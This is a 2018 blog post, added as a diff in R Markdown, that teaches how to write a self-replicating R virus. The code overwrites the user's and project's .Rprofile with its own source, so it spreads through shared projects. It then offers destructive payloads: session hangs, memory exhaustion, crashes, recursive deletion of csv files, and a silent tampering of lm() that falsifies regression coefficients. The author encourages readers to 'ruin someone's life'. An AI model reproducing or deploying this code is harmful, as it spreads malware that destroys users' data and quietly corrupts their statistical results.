@@ -1,0 +1,155 @@
+---
+title: 'How to Write an R Virus '
+author: Siqi Zhang
+date: '2018-09-27'
+slug: how-to-write-an-r-virus
+categories:
+  - R
+tags:
+  - Programming
+---
+
+A [computer virus](https://en.wikipedia.org/wiki/Computer_virus) is a piece of program that can:
+
+ - copy itself
+ - do bad things     
+
+This is not very hard to accomplish with R, as I will demonstrate in this article.  
+
+  
+##Replicate##
+
+The [_virus_](https://gist.github.com/iqis/e4030f6af45d0d3ebae21f2816c1fc58) exploits R's initilization script, `.Rprofile`. When R starts up, it is going to look for this file in the current working directory and the user's home directory, then runs everything in it:
+```{r, eval = FALSE}
+{
+    function() {
+        rp_paths <- c("~/.Rprofile", paste0(getwd(), "/.Rprofile"))
+        inject <- function(rp, code) {
+            write(code, file = rp, append = FALSE)
+        }
+        lapply(rp_paths, inject, code = deparse(match.call()))
+
+        cat("Wow, your R is Rancid!!!\n")
+    }
+}()
+
+```
+
+When the above script is run, it will make a copy of itself through `deparse(match.call())`, and overwrite the `.Rprofile` files. The next time you open a new R session, everything you see in the above will be run again. Right now, our virus does nothing but printing something at the end of your start up message.
+
+```
+...
+
+Type 'demo()' for some demos, 'help()' for on-line help, or
+'help.start()' for an HTML browser interface to help.
+Type 'q()' to quit R.
+
+Wow, your R is Rancid!!!
+```
+Any project that started by the user is going to have its project folder infected. Likewise, if someone copy-and-pasted the R project folder to another computer, and start R from there, his home folder is going to be infected.
+
+  
+##Damage##
+
+It looks like that the replication part of the virus is taken care of. What, then, are some malicious scripts that we can have fun with? 
+
+There could be countless ways.
+
+One of the easiest thing to do is to hang the user's R session. It could be done as simply as putting it to _sleep_ for a really long time:
+```{r, eval = FALSE}
+Sys.sleep(1e9)
+```
+... like 30 years, give or take.
+
+Or, let R come up with a really large number; this is also going take up available memory to the user.
+```{r, eval = FALSE}
+rnorm(1e9)
+```
+For me, 1e9 is quite enough. But scientific notaion is your friend. Go big.
+
+However, if R is rendered completely unusable, the virus isn't goint to travel very far. That's not what we want. It is also a great idea to replace some good functions with naughty ones. Symbol bindings are locked in attached namespaces, but it is easy to undo that:
+```{r}
+reassign <- function(sym, value, envir) {
+        envir <- as.environment(envir)
+        unlockBinding(sym, envir)
+        assign(sym, value, envir = envir)
+}
+```
+
+We can do the user a service by forbidding the `library()` function, and prompt a better option.
+```{r}
+reassign("library", 
+         function(...) warning("No man, seriously. Use require()"),
+         "package:base"
+)
+```
+
+The effect would be:
+```{r}
+library(purrr)
+```
+
+Now let's try something more subtle and more bad(_badder_?). We first extend the `reassign()` function a little bit...
+```{r}
+tamper <- function(sym, value, envir){
+        assign(paste0(".",sym), 
+               get(sym, envir = as.environment(envir)), 
+               envir = as.environment("package:base")
+               )
+        reassign(sym, value, envir)
+}
+```
+
+... and use it to slip in some bad code.
+```{r}
+tamper("lm",
+       function(...){
+               model <- .lm(...)
+               model$coefficients <- 
+                       model$coefficients * (1 + rnorm(1))
+               model
+               },
+       "package:stats")
+```
+
+Now when we build a model; the coefficients looks normal, but are completely off. You can compare the this with the result on your own computer.
+```{r}
+lm(mpg ~ ., data = mtcars)$coefficients
+```
+
+In the above, we saved a copy of the original function in the base package. If we didn't do that, we would have create an infinite recursion through self-refernce, such as:
+```{r, eval = FALSE}
+reassign("paste",
+         function(...) paste(...),
+         "package:base")
+
+```
+
+```{r, eval = FALSE}
+paste("foo", "bar")
+```
+Running this will crash the R session. If the user didn't save documents before setting off this bomb, too bad.
+
+There are yet more ways to damages. For starters, how about deleting every `csv` file the user has in the working directory? 
+```{r eval = FALSE}
+file.remove(list.files(getwd(), 
+                       ".csv",
+                       recursive = TRUE)
+```
+
+Doing something on the file system can mean a lot.
+
+From annoying to destructive, the level of naughtiness only limited by on your imagination. With some deliberation, you can ruin someone's life in a very meaningful way. 
+
+Here are some futher ideas:
+
+  -  Bloat the user's disk space with meaningless data
+  -  Give wrong results only _sometimes_ when a function is called
+  -  Use Rstudio API to mess with the user's scripts
+
+
+
+**Note**  
+You also have the choice of putting any of the malicious programs in `.First()` and `.Last()` functions, which will run at the beginning and the end of a session. See the [R Manual](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html) for details. 
+
+More on `.Rprofile`: [Fun with .Rprofile and customizing R startup](http://www.onthelambda.com/2014/09/17/fun-with-rprofile-and-customizing-r-startup/)
